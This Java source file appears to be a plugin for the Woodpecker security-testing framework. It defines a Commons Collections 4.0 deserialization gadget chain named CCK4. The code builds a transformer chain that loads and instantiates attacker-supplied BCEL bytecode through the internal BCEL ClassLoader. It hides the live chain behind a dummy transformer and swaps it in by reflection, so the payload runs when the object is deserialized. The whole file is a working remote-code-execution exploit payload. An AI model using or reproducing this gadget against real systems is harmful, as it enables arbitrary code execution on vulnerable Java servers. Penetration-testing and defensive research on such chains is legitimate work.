package me.gv7.woodpecker.plugin.gadgets.bcel;

import com.sun.org.apache.bcel.internal.util.ClassLoader;
import me.gv7.woodpecker.plugin.annotation.DependenciesVersion;
import me.gv7.woodpecker.plugin.annotation.RequireParameter;
import me.gv7.woodpecker.plugin.core.pojo.Input;
import me.gv7.woodpecker.plugin.gadgets.BcelPayload;
import me.gv7.woodpecker.plugin.gadgets.ObjectPayload;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

@DependenciesVersion("Commons-collections-4.0")
@RequireParameter("ResourcePath")
public class CCK4 implements ObjectPayload, BcelPayload {

    @Override
    public <T> Object getObject(Input input) throws Exception {
        Transformer[] fakeTransformers = new Transformer[] {new
                ConstantTransformer(1)};
        Transformer[]transformers = new Transformer[]{
                new ConstantTransformer(ClassLoader.class),
                new InvokerTransformer("getDeclaredConstructor", new Class[] {Class[].class}, new
                        Object[] {new Class[0]}),
                new InvokerTransformer("newInstance",new Class[] { Object[].class }, new
                        Object[] { new Object[0] }),
                new InvokerTransformer("loadClass", new Class[] { String.class }, new
                        Object[] { input.getBcel() }),
                new InvokerTransformer("newInstance",new Class[]{}, new Object[]{}),};
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        Map innerMap=new HashMap();
        Map outerMap = LazyMap.lazyMap(innerMap,transformerChain);
        TiedMapEntry tme=new TiedMapEntry(outerMap,"keykey");
        Map expMap= new HashMap();
        expMap.put(tme,"valuevalue");
        innerMap.remove("keykey");
        Field f =
                ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);
        return expMap;
    }
}
